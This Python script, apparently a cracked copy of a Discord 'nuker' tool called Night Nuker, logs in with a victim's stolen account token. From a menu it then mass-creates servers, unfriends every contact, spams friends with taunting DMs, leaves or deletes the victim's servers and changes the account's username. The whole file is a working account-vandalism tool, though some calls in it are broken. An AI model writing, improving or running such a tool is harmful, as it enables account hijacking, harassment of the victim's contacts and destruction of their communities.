import discord
import time
import requests
import os
import colorama
import subprocess
import datetime
import sys
from colorama import Fore
from discord.ext import commands
from futures3.thread import ThreadPoolExecutor
from pypresence import Presence
client_id = '809140791330209823'
RPC = Presence(client_id)
RPC.connect()
RPC.update(state='Attack Menu', details='Night Nuker v1.0.0', large_image='night')
#cracked by icy
def Clear():
    os.system('cls')

#cracked by icy
Clear()
os.system('Title Night Authorization')
os.system('mode 70, 30')

os.system('Title Token Authorization')
print(f"\n                    {Fore.MAGENTA}╔╗╔  ╦  ╔═╗  ╦ ╦  ╔╦╗\n                    {Fore.LIGHTBLACK_EX}║║║  ║  ║ ╦  ╠═╣   ║ \n                    {Fore.WHITE}╝╚╝  ╩  ╚═╝  ╩ ╩   ╩")
print('')
token = input(f"{Fore.WHITE}[{Fore.MAGENTA}NIGHT{Fore.WHITE}] Victims Token -{Fore.MAGENTA}${Fore.WHITE}> ")
head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
if src.status_code == 200:
    print(f"{Fore.LIGHTRED_EX}Token Autorization valid")
    time.sleep(2)
else:
    print(f"{Fore.LIGHTRED_EX}Token Autorization invalid")
    time.sleep(4)
    exit(0)
    cya()
os.system('cls')

def name():
    os.system('Title Night Nuker v1.0.0')

#cracked by icy

client = commands.Bot(';', self_bot=True)
client.remove_command('help')

def banner():
    clear()
    name()
    print(f" \n                        {Fore.MAGENTA}╔╗╔  ╦  ╔═╗  ╦ ╦  ╔╦╗\n                        {Fore.LIGHTBLACK_EX}║║║  ║  ║ ╦  ╠═╣   ║ \n                        {Fore.WHITE}╝╚╝  ╩  ╚═╝  ╩ ╩   ╩ \n\n                 [{Fore.MAGENTA}1{Fore.RESET}] Mass Server   ║ [{Fore.MAGENTA}4{Fore.RESET}] Server Leaver\n                 [{Fore.MAGENTA}2{Fore.RESET}] Mass Unfriend ║ [{Fore.MAGENTA}5{Fore.RESET}] Credits\n                 [{Fore.MAGENTA}3{Fore.RESET}] Massdm        ║ [{Fore.MAGENTA}6{Fore.RESET}] Change username\n                                                        ")

    def main_hud():
        exec = ThreadPoolExecutor(max_workers=1000)

        def massserver():
            clear()

            @client.event
            async def on_connect():
                for i in range(50):
                    exec.submit(await client.create_guild('OnnOalPDNIGHTPaldO', region=None, icon=None))
                    print(f"{Fore.WHITE}[{Fore.RED}NIGHT{Fore.WHITE}] Created server  #{i}")

        def massuser():
            clear()

            @client.event
            async def on_connect():
                for user in client.user.friends:
                    try:
                        exec.submit(await user.remove_friend())
                        print(f"{Fore.WHITE}[{Fore.RED}night{Fore.WHITE}] Removed relationship of {Fore.CYAN}${Fore.RESET}> {user.name}")
                    except:
                        print(f"{Fore.WHITE}[{Fore.CYAN}night{Fore.WHITE}] Unable to remove {Fore.CYAN}${Fore.RESET}> {user.name}")

        def massleave():
            clear()

            @client.event
            async def on_connect():
                for guild in client.guilds:
                    try:
                        exec.submit(await guild.leave())
                        print(f"{Fore.WHITE}[{Fore.CYAN}night{Fore.WHITE}] Left {Fore.CYAN}${Fore.RESET}> {guild.name}")
                    except:
                        exec.submit(await guild.delete())
                        print(f"{Fore.WHITE}[{Fore.CYAN}night{Fore.WHITE}] Deleted {Fore.CYAN}${Fore.RESET}> {guild.name}")

        def massdm():
            clear()
            unadd = input('do you want to mass unfriend also? Yes/No ')
            msg = input(f"{Fore.WHITE}[{Fore.MAGENTA}NIGHT{Fore.WHITE}] Message {Fore.MAGENTA}${Fore.RESET}> ")

            @client.event
            async def on_connect():
                if unadd == 'Yes':
                    for user in client.user.friends:
                        try:
                            kk = discord.Embed()
                            kk.set_author(name='night MASSDM')
                            kk.add_field(name=('night Nuked this clown -> ' + client.user.name), value=msg)
                            exec.submit(await user.send(embed=kk))
                            exec.submit(await user.remove_friend())
                            print(f"{Fore.WHITE}[{Fore.CYAN}night{Fore.WHITE}] Messaged {Fore.CYAN}${Fore.RESET}> {user.name}")
                        except:
                            print(f"{Fore.WHITE}[{Fore.CYAN}night{Fore.WHITE}] Unable to dm {Fore.CYAN}${Fore.RESET}> {user.name}")

                else:
                    if unadd == 'No':
                        for user in client.user.friends:
                            try:
                                kk = discord.Embed()
                                kk.set_author(name='night MASSDM')
                                kk.add_field(name=('Nuked this clown -> ' + client.user.name), value=msg)
                                exec.submit(await user.send(embed=kk))
                                print(f"{Fore.WHITE}[{Fore.CYAN}night{Fore.WHITE}] Messaged {Fore.CYAN}${Fore.RESET}> {user.name}")
                            except:
                                print(f"{Fore.WHITE}[{Fore.CYAN}night{Fore.WHITE}] Unable to dm {Fore.CYAN}${Fore.RESET}> {user.name}")

                    else:
                        print('Invalid Choice')
                        time.sleep(10)
                        massdm()

        def userchange():
            clear()
            newuser = input(f"Username you want {Fore.CYAN}${Fore.RESET}> ")
            password = input(f"Password {Fore.CYAN}${Fore.RESET}> ")

            @client.event
            async def on_connect():
                await client.user.edit(password=password, username=newuser)

        def credit():
            print('')
            print(f"Credit -> dain {Fore.CYAN}| {Fore.RESET} sain")
            time.sleep(10)

        kruh = input(f"{Fore.WHITE}[{Fore.CYAN}night{Fore.WHITE}] Choice {Fore.CYAN}${Fore.RESET}>")
        if kruh == '1':
            massserver()
        else:
            if kruh == '2':
                massuser()
            else:
                if kruh == '3':
                    massdm()
                else:
                    if kruh == '4':
                        massleave()
                    else:
                        if kruh == '6':
                            userchange()
                        else:
                            if kruh == '5':
                                credit()
                            else:
                                print('Invalid option ')
                                time.sleep(3)
                                clear()
                                banner()
                                main_hud()

    main_hud()

#cracked by icy

banner()
client.run(token, bot=False)
